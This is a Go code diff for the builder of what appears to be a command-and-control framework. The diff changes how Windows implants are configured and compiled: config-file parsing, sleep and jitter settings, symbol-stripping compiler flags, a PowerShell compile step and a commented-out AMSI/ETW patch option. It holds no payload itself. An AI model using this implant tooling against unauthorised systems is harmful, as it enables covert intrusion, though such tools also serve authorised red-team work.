@@ -22,15 +22,30 @@ type AgentBuilder struct {
 	Types.AgentBuilder
 }
 
-func (ab *AgentBuilder) ParseConfigFile() {
-
-}
-
-func NewImplantBuilder(config Types.BuilderConfig, path string) *Types.AgentBuilder {
-	var builder = new(Types.AgentBuilder)
+func NewImplantBuilder(path string) *AgentBuilder {
+	var builder = new(AgentBuilder)
 
 	builder.SourcePath = path + "/" + Types.PayloadDir + "/" + "Agent" + "/"
-	builder.ImplantConfig.Arch = Types.ARCHITECTURE_X64
+
+	ConfigPath := path + "\\Config\\"
+	BuilderConfig, err := Utility.ParseConfig(ConfigPath, "Builder.Config", &builder.CompilerOptions.Config)
+	if err != nil {
+		log.Println("[error] reading the configuration file")
+	}
+	if BuildConfig, ok := BuilderConfig.(*Types.BuilderConfig); ok {
+		builder.CompilerOptions.Config = *BuildConfig
+	} else {
+		log.Println("[error] type assertion failed", err)
+	}
+	ImplantConfig, err := Utility.ParseConfig(ConfigPath, "Implant.Config", &builder.ImplantConfig)
+	if err != nil {
+		log.Println("[error] reading the configuration file, implant config", err)
+	}
+	if ImpConfig, ok := ImplantConfig.(*Types.ImplantConfig); ok {
+		builder.ImplantConfig = *ImpConfig
+	} else {
+		log.Println("[error] type assertion failed", err)
+	}
 
 	builder.CompilerOptions.SourceDirs = []string{
 		"src/agent",
@@ -78,14 +93,14 @@ func NewImplantBuilder(config Types.BuilderConfig, path string) *Types.AgentBuil
 
 	*/
 
-	if config.DebugDev {
+	if builder.CompilerOptions.Config.DebugDev {
 		builder.CompilerOptions.CFlags = []string{
 			"",
 			"-Os -fno-asynchronous-unwind-tables -masm=intel",
 			"-fno-ident -fpack-struct=8 -falign-functions=1",
 			"-ffunction-sections -fdata-sections -falign-jumps=1 -w",
 			"-falign-labels=1 -fPIC",
-			"-Wl, --no-seh --enable-stdcall-fixup --gc-sections",
+			"-Wl, --no-seh --enable-stdcall-fixup --gc-sections ",
 		}
 	} else {
 		builder.CompilerOptions.CFlags = []string{"",
@@ -93,13 +108,12 @@ func NewImplantBuilder(config Types.BuilderConfig, path string) *Types.AgentBuil
 			"-fno-ident -fpack-struct=8 -falign-functions=1",
 			"-s -ffunction-sections -fdata-sections -falign-jumps=1 -w",
 			"-falign-labels=1 -fPIC",
-			"-Wl, -s, --no-seh --enable-stdcall-fixup --gc-sections",
+			"-Wl, -s, --no-seh --enable-stdcall-fixup --gc-sections ",
 		}
 	}
 
 	builder.CompilerOptions.Main.Exe = "src/main/main.c"
 
-	builder.CompilerOptions.Config = config
 	builder.PatchBinary = false
 
 	return builder
@@ -113,8 +127,12 @@ func (ab *AgentBuilder) Build() bool {
 	ab.CompileDir = "C:\\Windows\\Temp\\" + Types.PayloadDir + "\\"
 	err := os.Mkdir(ab.CompileDir, os.ModePerm)
 	if err != nil {
-		log.Println("[error] attempting to create compile directory: ", err.Error())
-		return false
+		if err.Error() == "mkdir C:\\Windows\\Temp\\Payloads\\: Cannot create a file when that file already exists." {
+			log.Println("[info] compile directory already exists")
+		} else {
+			log.Println("[error] attempting to create compile directory: ", err.Error())
+			return false
+		}
 	}
 
 	if ab.OutputPath == "" && ab.FileExtenstion != "" {
@@ -132,7 +150,7 @@ func (ab *AgentBuilder) Build() bool {
 		if i == (len(Config) - 1) {
 			ConfigByteString += fmt.Sprintf("0x%02x", Config[i])
 		} else {
-			ConfigByteString += fmt.Sprintf("0x%02x\\,", Config[i])
+			ConfigByteString += fmt.Sprintf("0x%02x`,", Config[i])
 		}
 	}
 	ConfigByteString += "}"
@@ -237,7 +255,7 @@ func (ab *AgentBuilder) PatchConfig() ([]byte, error) {
 		//AmsiPatch    = AMSIETW_PATCH_NONE
 		err error
 	)
-
+	log.Println("[info] the config values are: ", ab.ImplantConfig)
 	Sleep, err = strconv.Atoi(ab.ImplantConfig.Sleep)
 	if err != nil {
 		log.Println("[error] failed to convert sleep value to int: ", err)
@@ -251,9 +269,8 @@ func (ab *AgentBuilder) PatchConfig() ([]byte, error) {
 	}
 	if Jitter < 0 || Jitter > 100 {
 		return nil, errors.New("jitter value must be between 0 and 100")
-	} else {
+	} else if Jitter == 0 {
 		log.Println("[warning] jitter value not set, defaulting to 0")
-		Jitter = 0
 	}
 
 	AgentConfig.AddInt(Sleep)
@@ -341,7 +358,7 @@ func (ab *AgentBuilder) SetOutputPath(path string) {
 
 func (ab *AgentBuilder) CompileCmd(cmd string) bool {
 	var (
-		CommandLine = exec.Command("cmd", "/c", cmd)
+		CommandLine = exec.Command("powershell.exe", "-c", cmd)
 		stdout      bytes.Buffer
 		stderr      bytes.Buffer
 		err         error
@@ -351,8 +368,15 @@ func (ab *AgentBuilder) CompileCmd(cmd string) bool {
 	CommandLine.Stdout = &stdout
 	CommandLine.Stderr = &stderr
 
+	//TODO remove debug output
+	log.Println("[info] compiling agent with command: ", cmd)
+	log.Println("[info] compiling agent in directory: ", ab.SourcePath)
+
 	err = CommandLine.Run()
 	if err != nil {
+		//TODO remove debug output
+		log.Println("[error] stderr output: ", CommandLine.Stderr)
+		log.Println("[error] stdout output: ", CommandLine.Stdout)
 		log.Println("[error] failed to compile agent: ", err)
 		return false
 	}
